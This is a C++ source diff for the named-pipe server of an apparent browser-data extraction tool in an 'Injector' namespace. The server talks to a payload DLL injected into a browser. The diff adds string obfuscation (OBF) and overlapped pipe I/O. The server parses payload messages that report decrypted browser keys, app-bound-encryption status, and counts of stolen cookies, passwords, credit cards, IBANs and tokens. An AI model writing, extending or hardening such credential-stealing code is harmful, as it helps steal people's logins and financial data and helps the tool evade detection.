@@ -3,11 +3,40 @@
 
 #include "pipe_server.hpp"
 #include "../core/console.hpp"
+#include "../core/obfuscate.hpp"
 #include <iostream>
 #include <vector>
 #include <algorithm>
 #include <sstream>
 #include <regex>
+
+namespace {
+
+    static BOOL SyncWritePipe(HANDLE h, const void* buf, DWORD n, DWORD* written) {
+        OVERLAPPED ov = {};
+        ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+        BOOL ok = WriteFile(h, buf, n, written, &ov);
+        if (!ok && GetLastError() == ERROR_IO_PENDING) {
+            WaitForSingleObject(ov.hEvent, INFINITE);
+            ok = GetOverlappedResult(h, &ov, written, FALSE);
+        }
+        CloseHandle(ov.hEvent);
+        return ok;
+    }
+
+    static BOOL SyncReadPipe(HANDLE h, void* buf, DWORD n, DWORD* read) {
+        OVERLAPPED ov = {};
+        ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+        BOOL ok = ReadFile(h, buf, n, read, &ov);
+        if (!ok && GetLastError() == ERROR_IO_PENDING) {
+            WaitForSingleObject(ov.hEvent, INFINITE);
+            ok = GetOverlappedResult(h, &ov, read, FALSE);
+        }
+        CloseHandle(ov.hEvent);
+        return ok;
+    }
+
+}
 
 namespace Injector {
 
@@ -15,25 +44,66 @@ namespace Injector {
         : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {}
 
     void PipeServer::Create() {
-        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
+        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(),
+                                       PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                        1, 4096, 4096, 0, nullptr));
-        
+
         if (!m_hPipe) {
-            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
+            throw std::runtime_error(std::string(OBF("CreateNamedPipeW failed: ").c_str()) + std::to_string(GetLastError()));
         }
     }
 
-    void PipeServer::WaitForClient() {
-        if (!ConnectNamedPipe(m_hPipe.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
-            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(GetLastError()));
+    void PipeServer::WaitForClient(HANDLE hProcess) {
+        OVERLAPPED ov = {};
+        ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+        if (!ov.hEvent)
+            throw std::runtime_error(std::string(OBF("CreateEvent failed: ").c_str()) + std::to_string(GetLastError()));
+
+        BOOL connected = ConnectNamedPipe(m_hPipe.get(), &ov);
+        DWORD lastErr = GetLastError();
+
+        if (connected || lastErr == ERROR_PIPE_CONNECTED) {
+            CloseHandle(ov.hEvent);
+            return;
         }
+
+        if (lastErr != ERROR_IO_PENDING) {
+            CloseHandle(ov.hEvent);
+            throw std::runtime_error(std::string(OBF("ConnectNamedPipe failed: ").c_str()) + std::to_string(lastErr));
+        }
+
+        HANDLE waitOn[2] = { ov.hEvent, hProcess };
+        DWORD res = WaitForMultipleObjects(2, waitOn, FALSE, 30000);
+
+        if (res == WAIT_OBJECT_0) {
+            DWORD dummy = 0;
+            GetOverlappedResult(m_hPipe.get(), &ov, &dummy, FALSE);
+            CloseHandle(ov.hEvent);
+            return;
+        }
+
+        // Process died or timed out — cancel the pending connect and drain it
+        CancelIoEx(m_hPipe.get(), nullptr);
+        DWORD dummy = 0;
+        GetOverlappedResult(m_hPipe.get(), &ov, &dummy, TRUE);
+        CloseHandle(ov.hEvent);
+
+        if (res == WAIT_OBJECT_0 + 1) {
+            DWORD code = STILL_ACTIVE;
+            GetExitCodeProcess(hProcess, &code);
+            throw std::runtime_error(
+                std::string(OBF("Process exited (code: ").c_str()) + std::to_string(code) +
+                OBF(") before payload connected").c_str());
+        }
+
+        throw std::runtime_error(OBF("Timeout: payload did not connect within 30s").c_str());
     }
 
     void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
-        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
+        Write(verbose ? OBF("VERBOSE_TRUE").c_str() : OBF("VERBOSE_FALSE").c_str());
         Sleep(10);
-        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
+        Write(fingerprint ? OBF("FINGERPRINT_TRUE").c_str() : OBF("FINGERPRINT_FALSE").c_str());
         Sleep(10);
         Write(output.string());
         Sleep(10);
@@ -43,13 +113,13 @@ namespace Injector {
 
     void PipeServer::Write(const std::string& msg) {
         DWORD written = 0;
-        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
-            throw std::runtime_error("WriteFile failed");
+        if (!SyncWritePipe(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written)) {
+            throw std::runtime_error(std::string(OBF("WriteFile failed: ").c_str()) + std::to_string(GetLastError()));
         }
     }
 
     void PipeServer::ProcessMessages(bool verbose) {
-        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
+        const std::string completionSignal(OBF("__DLL_PIPE_COMPLETION_SIGNAL__").c_str());
         std::string accumulated;
         char buffer[4096];
         bool completed = false;
@@ -70,7 +140,7 @@ namespace Injector {
             }
 
             DWORD read = 0;
-            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
+            if (!SyncReadPipe(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read) || read == 0) {
                 if (GetLastError() == ERROR_BROKEN_PIPE) break;
                 continue;
             }
@@ -88,24 +158,24 @@ namespace Injector {
                     break;
                 }
 
-                if (msg.rfind("DEBUG:", 0) == 0) {
+                if (msg.rfind(OBF("DEBUG:").c_str(), 0) == 0) {
                     console.Debug(msg.substr(6));
                 }
-                else if (msg.rfind("PROFILE:", 0) == 0) {
+                else if (msg.rfind(OBF("PROFILE:").c_str(), 0) == 0) {
                     console.ProfileHeader(msg.substr(8));
                     m_stats.profiles++;
                 }
-                else if (msg.rfind("KEY:", 0) == 0) {
+                else if (msg.rfind(OBF("KEY:").c_str(), 0) == 0) {
                     console.KeyDecrypted(msg.substr(4));
                 }
-                else if (msg.rfind("NO_ABE:", 0) == 0) {
+                else if (msg.rfind(OBF("NO_ABE:").c_str(), 0) == 0) {
                     console.NoAbeWarning(msg.substr(7));
                     m_stats.noAbe = true;
                 }
-                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
+                else if (msg.rfind(OBF("ASTER_KEY:").c_str(), 0) == 0) {
                     console.AsterKeyDecrypted(msg.substr(10));
                 }
-                else if (msg.rfind("COOKIES:", 0) == 0) {
+                else if (msg.rfind(OBF("COOKIES:").c_str(), 0) == 0) {
                     size_t sep = msg.find(':', 8);
                     if (sep != std::string::npos) {
                         int count = std::stoi(msg.substr(8, sep - 8));
@@ -115,37 +185,37 @@ namespace Injector {
                         console.ExtractionResult("Cookies", count, total);
                     }
                 }
-                else if (msg.rfind("PASSWORDS:", 0) == 0) {
+                else if (msg.rfind(OBF("PASSWORDS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(10));
                     m_stats.passwords += count;
                     console.ExtractionResult("Passwords", count);
                 }
-                else if (msg.rfind("CARDS:", 0) == 0) {
+                else if (msg.rfind(OBF("CARDS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(6));
                     m_stats.cards += count;
                     console.ExtractionResult("Cards", count);
                 }
-                else if (msg.rfind("IBANS:", 0) == 0) {
+                else if (msg.rfind(OBF("IBANS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(6));
                     m_stats.ibans += count;
                     console.ExtractionResult("IBANs", count);
                 }
-                else if (msg.rfind("TOKENS:", 0) == 0) {
+                else if (msg.rfind(OBF("TOKENS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(7));
                     m_stats.tokens += count;
                     console.ExtractionResult("Tokens", count);
                 }
-                else if (msg.rfind("DATA:", 0) == 0) {
+                else if (msg.rfind(OBF("DATA:").c_str(), 0) == 0) {
                     std::string data = msg.substr(5);
                     size_t sep = data.find('|');
                     if (sep != std::string::npos) {
                         console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                     }
                 }
-                else if (msg.rfind("[-]", 0) == 0) {
+                else if (msg.rfind(OBF("[-]").c_str(), 0) == 0) {
                     console.Error(msg.substr(4));
                 }
-                else if (msg.rfind("[!]", 0) == 0) {
+                else if (msg.rfind(OBF("[!]").c_str(), 0) == 0) {
                     console.Warn(msg.substr(4));
                 }
                 else {
